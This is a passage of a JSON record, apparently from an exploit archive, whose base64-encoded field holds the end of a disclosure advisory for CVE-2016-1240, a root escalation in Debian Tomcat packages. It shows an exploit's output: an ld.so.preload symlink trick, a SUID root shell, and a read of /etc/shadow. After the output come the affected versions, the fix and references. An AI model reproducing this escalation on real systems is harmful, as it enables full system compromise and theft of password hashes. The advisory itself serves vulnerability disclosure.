XSBCYWNrZG9vci9sb3ctcHJpdiBzaGVsbCBpbnN0YWxsZWQgYXQ6IA0KLXJ3eHIteHIteCAxIHRvbWNhdDcgdG9tY2F0NyAxMDM3NDY0IFNlcCAzMCAyMjoyNyAvdG1wL3RvbWNhdHJvb3RzaA0KDQpbK10gU3ltbGluayBjcmVhdGVkIGF0OiANCmxyd3hyd3hyd3ggMSB0b21jYXQ3IHRvbWNhdDcgMTggU2VwIDMwIDIyOjI3IC92YXIvbG9nL3RvbWNhdDcvY2F0YWxpbmEub3V0IC0+IC9ldGMvbGQuc28ucHJlbG9hZA0KDQpbK10gV2FpdGluZyBmb3IgVG9tY2F0IHRvIHJlLW9wZW4gdGhlIGxvZ3MvVG9tY2F0IHNlcnZpY2UgcmVzdGFydC4uLg0KWW91IGNvdWxkIHNwZWVkIHRoaW5ncyB1cCBieSBleGVjdXRpbmcgOiBraWxsIFtUb21jYXQtcGlkXSAoYXMgdG9tY2F0IHVzZXIpIGlmIG5lZWRlZCA7KQ0KDQpbK10gVG9tY2F0IHJlc3RhcnRlZC4gVGhlIC9ldGMvbGQuc28ucHJlbG9hZCBmaWxlIGdvdCBjcmVhdGVkIHdpdGggdG9tY2F0IHByaXZpbGVnZXM6IA0KLXJ3LXItLXItLSAxIHRvbWNhdDcgcm9vdCAxOSBTZXAgMzAgMjI6MjggL2V0Yy9sZC5zby5wcmVsb2FkDQoNClsrXSBBZGRpbmcgL3RtcC9wcml2ZXNjbGliLnNvIHNoYXJlZCBsaWIgdG8gL2V0Yy9sZC5zby5wcmVsb2FkDQoNClsrXSBUaGUgL2V0Yy9sZC5zby5wcmVsb2FkIGZpbGUgbm93IGNvbnRhaW5zOiANCi90bXAvcHJpdmVzY2xpYi5zbw0KDQpbK10gRXNjYWxhdGluZyBwcml2aWxlZ2VzIHZpYSB0aGUgL3Vzci9iaW4vc3VkbyBTVUlEIGJpbmFyeSB0byBnZXQgcm9vdCENCg0KWytdIFJvb3RzaGVsbCBnb3QgYXNzaWduZWQgcm9vdCBTVUlEIHBlcm1zIGF0OiANCi1yd3Nyd3hyd3ggMSByb290IHJvb3QgMTAzNzQ2NCBTZXAgMzAgMjI6MjcgL3RtcC90b21jYXRyb290c2gNCg0KUGxlYXNlIHRlbGwgbWUgeW91J3JlIHNlZWluZyB0aGlzIHRvbyA7KSANCg0KWytdIEV4ZWN1dGluZyB0aGUgcm9vdHNoZWxsIC90bXAvdG9tY2F0cm9vdHNoIG5vdyEgDQoNCnRvbWNhdHJvb3RzaC00LjMjIGlkDQp1aWQ9MTEwKHRvbWNhdDcpIGdpZD0xMTgodG9tY2F0NykgZXVpZD0wKHJvb3QpIGdyb3Vwcz0xMTgodG9tY2F0NykNCnRvbWNhdHJvb3RzaC00LjMjIHdob2FtaQ0Kcm9vdA0KdG9tY2F0cm9vdHNoLTQuMyMgaGVhZCAtbjMgL2V0Yy9zaGFkb3cNCnJvb3Q6JDYkb2FmW2N1dF06MTY5MTI6MDo5OTk5OTo3Ojo6DQpkYWVtb246KjoxNjkxMjowOjk5OTk5Ojc6OjoNCmJpbjoqOjE2OTEyOjA6OTk5OTk6Nzo6Og0KdG9tY2F0cm9vdHNoLTQuMyMgZXhpdA0KZXhpdA0KDQpbK10gQ2xlYW5pbmcgdXAuLi4NCg0KWytdIEpvYiBkb25lLiBFeGl0aW5nIHdpdGggY29kZSAwIA0KDQoNCg0KVkkuIEJVU0lORVNTIElNUEFDVA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpMb2NhbCBhdHRhY2tlcnMgd2hvIGhhdmUgZ2FpbmVkIGFjY2VzcyB0byB0b21jYXQgdXNlciBhY2NvdW50IChmb3IgZXhhbXBsZSANCnJlbW90ZWx5IHZpYSBhIHZ1bG5lcmFibGUgd2ViIGFwcGxpY2F0aW9uLCBvciBsb2NhbGx5IHZpYSB3ZWFrIHdlYnJvb3QgcGVybXMpLA0KY291bGQgZXNjYWxhdGUgdGhlaXIgcHJpdmlsZWdlcyB0byByb290IGFuZCBmdWxseSBjb21wcm9taXNlIHRoZSBhZmZlY3RlZCBzeXN0ZW0uDQoNCiANClZJSS4gU1lTVEVNUyBBRkZFQ1RFRA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpUaGUgZm9sbG93aW5nIERlYmlhbiBwYWNrYWdlIHZlcnNpb25zIGFyZSBhZmZlY3RlZDoNCg0KVG9tY2F0IDggPD0gOC4wLjM2LTINClRvbWNhdCA3IDw9IDcuMC43MC0yDQpUb21jYXQgNiA8PSA2LjAuNDUrZGZzZy0xfmRlYjh1MQ0KDQpBIG1vcmUgZGV0YWlsZWQgbGlzdHMgb2YgYWZmZWN0ZWQgcGFja2FnZXMgY2FuIGJlIGZvdW5kIGF0Og0KDQpEZWJpYW46DQpodHRwczovL3NlY3VyaXR5LXRyYWNrZXIuZGViaWFuLm9yZy90cmFja2VyL0NWRS0yMDE2LTEyNDANCg0KVWJ1bnR1Og0KaHR0cDovL3d3dy51YnVudHUuY29tL3Vzbi91c24tMzA4MS0xLw0KDQpPdGhlciBzeXN0bWVzIHRoYXQgdXNlIFRvbWNhdCBwYWNrYWdlcyBwcm92aWRlZCBieSBEZWJpYW4gbWF5IGFsc28gYmUgYWZmZWN0ZWQuDQoNCiANClZJSUkuIFNPTFVUSU9ODQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkRlYmlhbiBTZWN1cml0eSBUZWFtIHdhcyBjb250YWN0ZWQgYW5kIGhhcyBmaXhlZCBhZmZlY3RlZCB1cHN0cmVhbSBwYWNrYWdlcy4NClVwZGF0ZSB0byB0aGUgbGF0ZXN0IHRvbWNhdCBwYWNrYWdlcyBwcm92aWRlZCBieSB5b3VyIGRpc3RyaWJ1dGlvbi4NCiANCklYLiBSRUZFUkVOQ0VTDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCmh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tDQoNCmh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvVG9tY2F0LURlYlBrZ3MtUm9vdC1Qcml2aWxlZ2UtRXNjYWxhdGlvbi1FeHBsb2l0LUNWRS0yMDE2LTEyNDAuaHRtbA0KDQpUaGUgZXhwbG9pdCdzIHNvdXJjZWNvZGUNCmh0dHA6Ly9sZWdhbGhhY2tlcnMuY29tL2V4cGxvaXRzL3RvbWNhdC1yb290cHJpdmVzYy1kZWIuc2gNCg0KQ1ZFLTIwMTYtMTI0MA0KaHR0cDovL2N2ZS5taXRyZS5vcmcvY2dpLWJpbi9jdmVuYW1lLmNnaT9uYW1lPUNWRS0yMDE2LTEyNDANCg0KVWJ1bnR1IFNlY3VyaXR5IE5vdGljZSBVU04tMzA4MS0xOg0KaHR0cDovL3d3dy51YnVudHUuY29tL3Vzbi91c24tMzA4MS0xLw0KDQpEZWJpYW4gU2VjdXJpdHkgQWR2aXNvcnkgRFNBLTM2NjktMSAodG9tY2F0Nyk6DQpodHRwczovL2xpc3RzLmRlYmlhbi5vcmcvZGViaWFuLXNlY3VyaXR5LWFubm91bmNlLzIwMTYvbXNnMDAyNDkuaHRtbA0KaHR0cHM6Ly93d3cuZGViaWFuLm9yZy9zZWN1cml0eS8yMDE2L2RzYS0zNjY5DQoNCkRlYmlhbiBTZWN1cml0eSBBZHZpc29yeSBEU0EtMzY3MC0xICh0b21jYXQ4KToNCmh0dHBzOi8vd3d3LmRlYmlhbi5vcmcvc2VjdXJpdHkvMjAxNi9kc2EtMzY3MA0KDQpodHRwczovL3NlY3VyaXR5LXRyYWNrZXIuZGViaWFuLm9yZy90cmFja2VyL0NWRS0yMDE2LTEyNDANCg0KDQpYLiBDUkVESVRTDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNClRoZSB2dWxuZXJhYmlsaXR5IGhhcyBiZWVuIGRpc2NvdmVyZWQgYnkgRGF3aWQgR29sdW5za2kNCmRhd2lkIChhdCkgbGVnYWxoYWNrZXJzIChkb3QpIGNvbQ0KaHR0cDovL2xlZ2FsaGFja2Vycy5jb20NCiANClhJLiBSRVZJU0lPTiBISVNUT1JZDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCjMwLjA5LjIwMTYgLSBBZHZpc29yeSByZWxlYXNlZA0KIA0KWElJLiBMRUdBTCBOT1RJQ0VTDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNClRoZSBpbmZvcm1hdGlvbiBjb250YWluZWQgd2l0aGluIHRoaXMgYWR2aXNvcnkgaXMgc3VwcGxpZWQgImFzLWlzIiB3aXRoDQpubyB3YXJyYW50aWVzIG9yIGd1YXJhbnRlZXMgb2YgZml0bmVzcyBvZiB1c2Ugb3Igb3RoZXJ3aXNlLiBJIGFjY2VwdCBubw0KcmVzcG9uc2liaWxpdHkgZm9yIGFueSBkYW1hZ2UgY2F1c2VkIGJ5IHRoZSB1c2Ugb3IgbWlzdXNlIG9mIHRoaXMgaW5mb3JtYXRpb24u", 
    "filename": "platforms/linux/local/40450.txt", 
    "id": "40450", 
    "cves": [
        "CVE-2016-1240"
    ]
}